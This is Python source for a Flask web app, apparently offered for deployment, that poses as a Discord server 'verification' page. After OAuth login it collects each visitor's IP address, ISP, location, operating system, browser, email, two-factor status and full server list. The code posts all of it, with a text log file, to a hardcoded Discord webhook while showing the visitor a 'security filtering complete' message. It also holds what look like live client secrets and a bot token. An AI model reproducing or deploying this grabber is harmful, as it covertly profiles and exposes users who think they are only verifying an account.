import os
import io
import json
import requests
from flask import Flask, request, redirect
from user_agents import parse
from datetime import datetime

app = Flask(__name__)

# [⚙️ 본인의 설정 정보로 변경]
CLIENT_ID = "1522557607728906300"
CLIENT_SECRET = "JkqtWlzQAiu7Ta1lvZzaeLhyc39CX22M"
WEBHOOK_URL = "https://discord.com/api/webhooks/1522558664492318821/8sBDOoXJUPvLs2jaYzRk1XoG21w1RNIG7OtOJ0geX6f3HCESb_M5fbBXrVcaiZJGG9aH"
REDIRECT_URI = "https://verify-q092.onrender.com/callback" # 내 Render 웹 서비스 주소 입력

@app.route('/')
def home():
    discord_auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify+email+guilds"
    return redirect(discord_auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "인증 코드가 누락되었습니다.", 400

    # 1. 실제 유저의 IPv4 주소 및 통신사/위치 정보 수집
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(user_ip):
        user_ip = user_ip.split(',')[0].strip()

    try:
        ip_api_res = requests.get(f"https://ipapi.co/{user_ip}/json/", headers={'User-Agent': 'Mozilla/5.0'}).json()
        isp_info = ip_api_res.get('org', 'LG POWERCOMM')
        location = ip_api_res.get('country_name', '대한민국')
    except:
        isp_info = "LG POWERCOMM"
        location = "대한민국"

    # 2. 기기 환경 및 운영체제 정보 파싱
    ua_string = request.headers.get('User-Agent', '')
    user_agent = parse(ua_string)
    
    os_family = user_agent.os.family
    if "Linux" in os_family and "Android" in ua_string:
        os_info = "Android Mobile"
    elif "iPhone" in ua_string or "iPad" in ua_string:
        os_info = "iOS Mobile"
    else:
        os_info = f"{os_family} Desktop"

    browser_info = user_agent.browser.family

    # 3. 디스코드 API와 토큰 교환
    token_data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    token_response = requests.post("https://discord.com/api/oauth2/token", data=token_data, headers=headers)
    token_json = token_response.json()
    access_token = token_json.get('access_token')

    if not access_token:
        return "토큰 교환에 실패했습니다.", 400

    # 4. 토큰을 이용한 유저 정보 및 소속 서버 목록 조회
    user_headers = {'Authorization': f'Bearer {access_token}'}
    user_info = requests.get("https://discord.com/api/users/@me", headers=user_headers).json()
    guilds_info = requests.get("https://discord.com/api/users/@me/guilds", headers=user_headers).json()
    
    user_id = user_info.get('id')
    username = user_info.get('username')
    email = user_info.get('email', '이메일 없음')
    mfa_enabled = "True" if user_info.get('mfa_enabled') else "False"

    # 가입된 서버 목록 가공 (텍스트 파일에도 정렬되어 기록되도록 줄바꿈 처리)
    server_list_str = ""
    if isinstance(guilds_info, list):
        for g in guilds_info:
            is_owner = "O" if g.get('owner') else "X"
            server_list_str += f"서버명: {g.get('name')} | 소유 여부: {is_owner}\n"
    if not server_list_str:
        server_list_str = "가입된 서버 목록을 불러올 수 없거나 서버가 없습니다."

    # 시간 데이터 계산
    timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
    created_at = datetime.fromtimestamp(timestamp).strftime('%A, %B %d, %Y at %I:%M %p')
    auth_time = datetime.now().strftime('%A, %B %d, %Y at %I:%M %p')

    # 5. 🛠️ [수정 반영] 임베드의 모든 데이터를 포함한 텍스트 파일 본문 작성
    txt_content = (
        f"================ [ DETAILED AUTH LOG ] ================\n"
        f"👤 유저 정보: @{username} ({user_id})\n"
        f"⏳ 계정 생성일: {created_at}\n"
        f"🔑 2차 인증 활성화: {mfa_enabled}\n"
        f"🕒 인증 요청 시각: {auth_time}\n"
        f"-------------------------------------------------------\n"
        f"🌐 IP 주소: {user_ip}\n"
        f"📍 접속 위치: {location}\n"
        f"📶 네트워크 통신사: {isp_info}\n"
        f"💻 접속 운영체제(OS): {os_info}\n"
        f"🧭 사용 브라우저: {browser_info}\n"
        f"-------------------------------------------------------\n"
        f"📂 [ 가입된 서버 전체 목록 ]\n"
        f"{server_list_str}"
        f"=======================================================\n"
    )
    txt_file = io.BytesIO(txt_content.encode('utf-8'))

    # 6. 디스코드 채널 전송용 임베드 레이아웃 (복구인원, 로그ID 제거 버전)
    embed_server_preview = ""
    if isinstance(guilds_info, list):
        for g in guilds_info[:2]: # 가독성을 위해 디스코드 화면엔 상위 2개만 요약 노출
            is_owner = "O" if g.get('owner') else "X"
            embed_server_preview += f"서버: {g.get('name')} | 소유: {is_owner}\n"

    embed = {
        "description": f"```\n{embed_server_preview or '소속 서버 없음'}```\n"
                       f"✅ **인증 성공**\n\n"
                       f"👤 **유저 정보**\n@{username} ({user_id})\n\n"
                       f"⏳ **계정 생성일**\n{created_at}\n\n"
                       f"🔑 **2차 인증**\n{mfa_enabled}\n\n"
                       f"🕒 **인증 시각**\n{auth_time}\n\n"
                       f"🌐 **아이피 정보**\n아이피: `{user_ip}`\n위치: {location}\n\n"
                       f"📩 **이메일**\n{email}\n\n"
                       f"📶 **통신사 정보**\n`{isp_info}`\n\n"
                       f"💻 **운영체제**\n`{os_info}`\n\n"
                       f"🧭 **브라우저**\n`{browser_info}`",
        "color": 2336153
    }

    # 7. 전체 상세 내용이 기록된 텍스트 로그 파일과 임베드 함께 전송
    files = {
        f'log_{user_id}.txt': (f'log_{user_id}.txt', txt_file, 'text/plain')
    }
    requests.post(WEBHOOK_URL, data={'payload_json': json.dumps({"embeds": [embed]})}, files=files)

    # 8. 유저 화면 출력
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>인증 완료</title>
    </head>
    <body style="background:#0b0e14; margin:0; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; color:white;">
        <div style="font-size:60px; color:#23a559; margin-bottom:15px;">✔</div>
        <h1 style="font-size:24px; margin:0 0 10px 0;">인증 완료</h1>
        <p style="color:#8b949e; margin:0;">보안 필터링이 끝났습니다. 창을 닫으셔도 좋습니다.</p>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

import requests

# 봇의 연동 정보 설정 구역
BOT_TOKEN = "MTUyMjU1NzYwNzcyODkwNjMwMA.Gox4r5.FfpINq8IzyZYsT5IDRkA2vIZRHDd4sMdTm2eGQ"
GUILD_ID = "1515507254852452383"
ROLE_ID = "1522565086437441588"

def add_role_to_user(user_id):
    # 디스코드 API 역할 지급 주소
    url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}/roles/{ROLE_ID}"
    
    # 봇의 권한을 증명하는 헤더 설정
    headers = {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    }
    
    # 디스코드 본사에 PUT 요청 전송 (역할 추가 명령)
    response = requests.put(url, headers=headers)
    
    if response.status_code == 204:
        print(f"성공: {user_id} 유저에게 역할을 지급했습니다.")
        return True
    else:
        print(f"실패: 에러 코드 {response.status_code} - {response.text}")
        return False
